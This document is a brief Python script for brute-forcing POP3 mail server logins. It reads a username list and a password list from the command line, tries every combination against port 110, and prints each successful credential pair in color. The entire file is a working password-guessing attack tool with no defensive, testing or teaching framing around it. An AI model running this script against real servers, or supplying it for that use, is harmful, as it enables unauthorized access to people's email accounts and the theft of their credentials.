import poplib
import sys

# ANSI colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

server = sys.argv[1]
port = 110

# Wordlists
userlist = sys.argv[2]
passlist = sys.argv[3]

# Read usernames
with open(userlist, "r") as f:
    users = [u.strip() for u in f.readlines()]

# Read passwords
with open(passlist, "r") as f:
    passwords = [p.strip() for p in f.readlines()]

for user in users:
    for password in passwords:
        print(f"{YELLOW}[*] Trying {user}:{password}{RESET}")

        try:
            pop = poplib.POP3(server, port, timeout=5)
            pop.user(user)
            pop.pass_(password)

            print(f"{GREEN}[✔] Login successful → {user}:{password}{RESET}")
            pop.quit()

        except poplib.error_proto:
            print(f"{RED}[✘] Login failed{RESET}")

        except Exception as e:
            print(f"{RED}[✘] Connection error: {e}{RESET}")
            break
